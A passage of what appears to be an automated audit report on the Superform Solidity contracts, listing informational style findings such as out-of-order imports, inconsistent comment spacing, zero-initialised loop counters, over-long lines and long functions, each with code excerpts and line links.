12: import { ILayerZeroEndpoint } from "src/vendor/layerzero/ILayerZeroEndpoint.sol";

```

[10](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L10), [11](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L11), [12](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L12)

```solidity
File: superform-core/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol

/// @audit Out of order with the below import️:
///        src/types/DataTypes.sol
///        src/libraries/Error.sol

10: import { IWormholeRelayer, VaaKey } from "src/vendor/wormhole/IWormholeRelayer.sol";

/// @audit Out of order with the below import️:
///        src/types/DataTypes.sol
///        src/libraries/Error.sol

11: import { IWormholeReceiver } from "src/vendor/wormhole/IWormholeReceiver.sol";

```

[10](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol#L10), [11](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol#L11)

```solidity
File: superform-core/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol

/// @audit Out of order with the below import️:
///        src/libraries/Error.sol

9: import { IWormhole } from "src/vendor/wormhole/IWormhole.sol";

```

[9](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol#L9)

```solidity
File: superform-core/src/crosschain-data/extensions/CoreStateRegistry.sol

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol
///        BaseStateRegistry.sol

7: import { ISuperRBAC } from "../../interfaces/ISuperRBAC.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol
///        BaseStateRegistry.sol

8: import { ISuperPositions } from "../../interfaces/ISuperPositions.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol
///        BaseStateRegistry.sol

9: import { ISuperRegistry } from "../../interfaces/ISuperRegistry.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol
///        BaseStateRegistry.sol

10: import { IPaymentHelper } from "../../interfaces/IPaymentHelper.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol
///        BaseStateRegistry.sol

11: import { IBaseForm } from "../../interfaces/IBaseForm.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol
///        BaseStateRegistry.sol

12: import { IDstSwapper } from "../../interfaces/IDstSwapper.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol
///        BaseStateRegistry.sol

13: import { ISuperformFactory } from "../../interfaces/ISuperformFactory.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol
///        BaseStateRegistry.sol

14: import { ICoreStateRegistry } from "../../interfaces/ICoreStateRegistry.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol
///        BaseStateRegistry.sol

15: import { IBridgeValidator } from "../../interfaces/IBridgeValidator.sol";

```

[7](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L7), [8](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L8), [9](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L9), [10](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L10), [11](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L11), [12](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L12), [13](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L13), [14](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L14), [15](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L15)

```solidity
File: superform-core/src/crosschain-data/extensions/TimelockStateRegistry.sol

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/utils/ReentrancyGuard.sol

5: import { IBaseForm } from "../../interfaces/IBaseForm.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/utils/ReentrancyGuard.sol

6: import { ISuperformFactory } from "../../interfaces/ISuperformFactory.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/utils/ReentrancyGuard.sol

7: import { ISuperRegistry } from "../../interfaces/ISuperRegistry.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/utils/ReentrancyGuard.sol

8: import { IBridgeValidator } from "../../interfaces/IBridgeValidator.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/utils/ReentrancyGuard.sol

9: import { IQuorumManager } from "../../interfaces/IQuorumManager.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/utils/ReentrancyGuard.sol

10: import { ISuperPositions } from "../../interfaces/ISuperPositions.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/utils/ReentrancyGuard.sol

11: import { IERC4626TimelockForm } from "../../forms/interfaces/IERC4626TimelockForm.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/utils/ReentrancyGuard.sol

12: import { ITimelockStateRegistry } from "../../interfaces/ITimelockStateRegistry.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/utils/ReentrancyGuard.sol

13: import { IBaseStateRegistry } from "../../interfaces/IBaseStateRegistry.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/utils/ReentrancyGuard.sol

14: import { ISuperRBAC } from "../../interfaces/ISuperRBAC.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/utils/ReentrancyGuard.sol

15: import { IPaymentHelper } from "../../interfaces/IPaymentHelper.sol";

```

[5](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/TimelockStateRegistry.sol#L5), [6](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/TimelockStateRegistry.sol#L6), [7](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/TimelockStateRegistry.sol#L7), [8](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/TimelockStateRegistry.sol#L8), [9](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/TimelockStateRegistry.sol#L9), [10](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/TimelockStateRegistry.sol#L10), [11](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/TimelockStateRegistry.sol#L11), [12](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/TimelockStateRegistry.sol#L12), [13](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/TimelockStateRegistry.sol#L13), [14](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/TimelockStateRegistry.sol#L14), [15](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/TimelockStateRegistry.sol#L15)

```solidity
File: superform-core/src/crosschain-liquidity/DstSwapper.sol

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol
///        openzeppelin-contracts/contracts/utils/ReentrancyGuard.sol

7: import { IDstSwapper } from "../interfaces/IDstSwapper.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol
///        openzeppelin-contracts/contracts/utils/ReentrancyGuard.sol

8: import { ISuperRegistry } from "../interfaces/ISuperRegistry.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol
///        openzeppelin-contracts/contracts/utils/ReentrancyGuard.sol

9: import { IBaseStateRegistry } from "../interfaces/IBaseStateRegistry.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol
///        openzeppelin-contracts/contracts/utils/ReentrancyGuard.sol

10: import { IBridgeValidator } from "../interfaces/IBridgeValidator.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol
///        openzeppelin-contracts/contracts/utils/ReentrancyGuard.sol
///        crosschain-liquidity/LiquidityHandler.sol

12: import { ISuperRBAC } from "../interfaces/ISuperRBAC.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol
///        openzeppelin-contracts/contracts/utils/ReentrancyGuard.sol
///        crosschain-liquidity/LiquidityHandler.sol

13: import { IERC4626Form } from "../forms/interfaces/IERC4626Form.sol";

```

[7](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/DstSwapper.sol#L7), [8](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/DstSwapper.sol#L8), [9](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/DstSwapper.sol#L9), [10](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/DstSwapper.sol#L10), [12](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/DstSwapper.sol#L12), [13](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/DstSwapper.sol#L13)

```solidity
File: superform-core/src/crosschain-liquidity/lifi/LiFiValidator.sol

/// @audit Out of order with the below import️:
///        src/crosschain-liquidity/BridgeValidator.sol
///        src/libraries/Error.sol
///        src/vendor/lifi/LiFiTxDataExtractor.sol
///        src/vendor/lifi/LibSwap.sol

8: import { ILiFi } from "src/vendor/lifi/ILiFi.sol";

```

[8](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/lifi/LiFiValidator.sol#L8)

```solidity
File: superform-core/src/crosschain-liquidity/socket/SocketOneInchValidator.sol

/// @audit Out of order with the below import️:
///        src/libraries/Error.sol
///        src/crosschain-liquidity/BridgeValidator.sol

6: import { ISocketOneInchImpl } from "src/vendor/socket/ISocketOneInchImpl.sol";

```

[6](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/socket/SocketOneInchValidator.sol#L6)

```solidity
File: superform-core/src/crosschain-liquidity/socket/SocketValidator.sol

/// @audit Out of order with the below import️:
///        src/libraries/Error.sol
///        src/crosschain-liquidity/BridgeValidator.sol

6: import { ISocketRegistry } from "src/vendor/socket/ISocketRegistry.sol";

```

[6](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/socket/SocketValidator.sol#L6)

```solidity
File: superform-core/src/forms/ERC4626FormImplementation.sol

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol

7: import { IERC4626 } from "openzeppelin-contracts/contracts/interfaces/IERC4626.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol
///        crosschain-liquidity/LiquidityHandler.sol
///        types/DataTypes.sol
///        BaseForm.sol

11: import { IBridgeValidator } from "../interfaces/IBridgeValidator.sol";

```

[7](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626FormImplementation.sol#L7), [11](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626FormImplementation.sol#L11)

```solidity
File: superform-core/src/forms/ERC4626TimelockForm.sol

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol

6: import { IERC4626TimelockVault } from "super-vaults/interfaces/IERC4626TimelockVault.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol
///        types/DataTypes.sol
///        ERC4626FormImplementation.sol
///        BaseForm.sol

10: import { IBridgeValidator } from "../interfaces/IBridgeValidator.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol
///        types/DataTypes.sol
///        ERC4626FormImplementation.sol
///        BaseForm.sol

11: import { ITimelockStateRegistry } from "../interfaces/ITimelockStateRegistry.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol
///        types/DataTypes.sol
///        ERC4626FormImplementation.sol
///        BaseForm.sol

12: import { IEmergencyQueue } from "../interfaces/IEmergencyQueue.sol";

```

[6](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626TimelockForm.sol#L6), [10](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626TimelockForm.sol#L10), [11](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626TimelockForm.sol#L11), [12](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626TimelockForm.sol#L12)

```solidity
File: superform-core/src/payments/PayMaster.sol

/// @audit Out of order with the below import️:
///        libraries/Error.sol

5: import { ISuperRBAC } from "../interfaces/ISuperRBAC.sol";

/// @audit Out of order with the below import️:
///        libraries/Error.sol

6: import { IPayMaster } from "../interfaces/IPayMaster.sol";

/// @audit Out of order with the below import️:
///        libraries/Error.sol

7: import { ISuperRegistry } from "../interfaces/ISuperRegistry.sol";

/// @audit Out of order with the below import️:
///        libraries/Error.sol

8: import { IBridgeValidator } from "../interfaces/IBridgeValidator.sol";

/// @audit Out of order with the below import️:
///        libraries/Error.sol

9: import { IAmbImplementation } from "../interfaces/IAmbImplementation.sol";

```

[5](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PayMaster.sol#L5), [6](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PayMaster.sol#L6), [7](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PayMaster.sol#L7), [8](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PayMaster.sol#L8), [9](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PayMaster.sol#L9)

```solidity
File: superform-core/src/payments/PaymentHelper.sol

/// @audit Out of order with the below import️:
///        vendor/chainlink/AggregatorV3Interface.sol

5: import { IPaymentHelper } from "../interfaces/IPaymentHelper.sol";

/// @audit Out of order with the below import️:
///        vendor/chainlink/AggregatorV3Interface.sol

6: import { ISuperRBAC } from "../interfaces/ISuperRBAC.sol";

/// @audit Out of order with the below import️:
///        vendor/chainlink/AggregatorV3Interface.sol

7: import { ISuperRegistry } from "../interfaces/ISuperRegistry.sol";

/// @audit Out of order with the below import️:
///        vendor/chainlink/AggregatorV3Interface.sol

8: import { IBaseStateRegistry } from "../interfaces/IBaseStateRegistry.sol";

/// @audit Out of order with the below import️:
///        vendor/chainlink/AggregatorV3Interface.sol

9: import { IAmbImplementation } from "../interfaces/IAmbImplementation.sol";

```

[5](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L5), [6](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L6), [7](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L7), [8](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L8), [9](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L9)

```solidity
File: superform-core/src/settings/SuperRBAC.sol

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/access/extensions/AccessControlEnumerable.sol

5: import { IBroadcastRegistry } from "../interfaces/IBroadcastRegistry.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/access/extensions/AccessControlEnumerable.sol

6: import { ISuperRegistry } from "../interfaces/ISuperRegistry.sol";

/// @audit Out of order with the below import️:
///        openzeppelin-contracts/contracts/access/extensions/AccessControlEnumerable.sol

7: import { ISuperRBAC } from "../interfaces/ISuperRBAC.sol";

```

[5](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L5), [6](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L6), [7](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L7)



### Inconsistent spacing in comments

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Some lines use // x and some use //x. The instances below point out the usages that don't follow the majority, within each file

*Instances (1)*:

```solidity
File: superform-core/src/settings/SuperRBAC.sol

1: //SPDX-License-Identifier: Apache-2.0

```

[1](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L1)



### Don't initialize `uint`s and `int`s with zero

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

*Instances (5)*:

```solidity
File: ERC1155A/src/ERC1155A.sol

169:         for (uint256 i = 0; i < owners.length; ++i) {

274:         for (uint256 i = 0; i < ids.length; ++i) {

293:         for (uint256 i = 0; i < ids.length; ++i) {

463:         for (uint256 i = 0; i < idsLength; ++i) {

496:         for (uint256 i = 0; i < idsLength; ++i) {

```

[169](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L169), [274](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L274), [293](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L293), [463](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L463), [496](https://github.com/superform-xyz/ERC1155A/tree/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L496)




### Interfaces should be defined in separate files from their usage

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

The interfaces below should be defined in separate files, so that it's easier for future projects to import them, and to avoid duplication later on if they need to be used elsewhere in the project

*Instances (2)*:

```solidity
File: superform-core/src/crosschain-data/BroadcastRegistry.sol

12: interface Target {

```

[12](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/BroadcastRegistry.sol#L12)

```solidity
File: superform-core/src/payments/PaymentHelper.sol

17: interface ReadOnlyBaseRegistry is IBaseStateRegistry {

```

[17](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L17)




### Lines are too long

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Usually lines in source code are limited to [80](https://softwareengineering.stackexchange.com/questions/148677/why-is-80-characters-the-standard-limit-for-code-width)characters. Today's screens are much larger so it's reasonable to stretch this in some cases. The solidity style guide recommends a maximumum line length of [120 characters](https://docs.soliditylang.org/en/v0.8.17/style-guide.html#maximum-line-length), so the lines below should be split when they reach that length.

*Instances (7)*:

```solidity
File: superform-core/src/EmergencyQueue.sol

96:             QueuedWithdrawal(srcSender_, data_.receiverAddress, data_.superformId, data_.amount, data_.payloadId, false);

```

[96](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/EmergencyQueue.sol#L96)

```solidity
File: superform-core/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol

147:         (bytes32 messageId, uint32 destinationDomain, uint256 gasAmount) = abi.decode(data_, (bytes32, uint32, uint256));

```

[147](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/hyperlane/HyperlaneImplementation.sol#L147)

```solidity
File: superform-core/src/crosschain-data/utils/PayloadHelper.sol

355:         InitMultiVaultData memory imvd = abi.decode(coreStateRegistry_.payloadBody(dstPayloadId_), (InitMultiVaultData));

```

[355](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/utils/PayloadHelper.sol#L355)

```solidity
File: superform-core/src/crosschain-liquidity/socket/SocketValidator.sol

70:                 || (decodedReq.middlewareRequest.id != 0 && args_.liqDataToken != decodedReq.middlewareRequest.inputToken)

```

[70](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/socket/SocketValidator.sol#L70)

```solidity
File: superform-core/src/payments/PaymentHelper.sol

824:         nextPayloadId = ReadOnlyBaseRegistry(superRegistry.getAddress(keccak256("CORE_STATE_REGISTRY"))).payloadsCount();

```

[824](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L824)

```solidity
File: superform-core/src/settings/SuperRBAC.sol

4: import { AccessControlEnumerable } from "openzeppelin-contracts/contracts/access/extensions/AccessControlEnumerable.sol";

189:         (, bytes32 role, bytes32 superRegistryAddressId) = abi.decode(rolesPayload.message, (uint256, bytes32, bytes32));

```

[4](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L4), [189](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L189)




### Long functions should be refactored into multiple functions

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Consider splitting long functions into multiple, smaller functions to improve the code readability.

*Instances (20)*:


```solidity
File: superform-core/src/BaseRouterImplementation.sol

/// @audit number of line: 77
128:     function _singleXChainSingleVaultDeposit(SingleXChainSingleVaultStateReq memory req_) internal virtual {

/// @audit number of line: 69
232:     function _singleXChainMultiVaultDeposit(SingleXChainMultiVaultStateReq memory req_) internal virtual {

/// @audit number of line: 63
345:     function _singleXChainSingleVaultWithdraw(SingleXChainSingleVaultStateReq memory req_) internal virtual {

/// @audit number of line: 73
878:     function _singleVaultTokenForward(

/// @audit number of line: 98
953:     function _multiVaultTokenForward(

```

[128](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L128), [232](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L232), [345](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L345), [878](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L878), [953](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L953)

```solidity
File: superform-core/src/crosschain-data/extensions/CoreStateRegistry.sol

/// @audit number of line: 58
147:     function processPayload(uint256 payloadId_) external payable virtual override {

/// @audit number of line: 69
386:     function _updateMultiDeposit(

/// @audit number of line: 90
499:     function _updateAmount(

/// @audit number of line: 58
627:     function _updateTxData(

/// @audit number of line: 61
687:     function _multiWithdrawal(

/// @audit number of line: 90
750:     function _multiDeposit(

```

[147](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L147), [386](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L386), [499](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L499), [627](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L627), [687](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L687), [750](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L750)

```solidity
File: superform-core/src/crosschain-data/extensions/TimelockStateRegistry.sol

/// @audit number of line: 80
119:     function finalizePayload(

```

[119](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/TimelockStateRegistry.sol#L119)

```solidity
File: superform-core/src/crosschain-liquidity/DstSwapper.sol

/// @audit number of line: 82
280:     function _processTx(

```

[280](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/DstSwapper.sol#L280)

```solidity
File: superform-core/src/crosschain-liquidity/lifi/LiFiValidator.sol

/// @audit number of line: 87
31:     function validateTxData(ValidateTxDataArgs calldata args_) external view override returns (bool hasDstSwap) {

```

[31](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/lifi/LiFiValidator.sol#L31)

```solidity
File: superform-core/src/forms/ERC4626FormImplementation.sol

/// @audit number of line: 88
156:     function _processDirectDeposit(InitSingleVaultData memory singleVaultData_) internal returns (uint256 dstAmount) {

/// @audit number of line: 56
275:     function _processDirectWithdraw(

/// @audit number of line: 66
333:     function _processXChainWithdraw(

```

[156](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626FormImplementation.sol#L156), [275](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626FormImplementation.sol#L275), [333](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626FormImplementation.sol#L333)

```solidity
File: superform-core/src/forms/ERC4626TimelockForm.sol

/// @audit number of line: 62
64:     function withdrawAfterCoolDown(TimelockPayload memory p_)

```

[64](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626TimelockForm.sol#L64)

```solidity
File: superform-core/src/payments/PaymentHelper.sol

/// @audit number of line: 59
139:     function estimateMultiDstMultiVault(

/// @audit number of line: 65
461:     function updateRemoteChain(

```

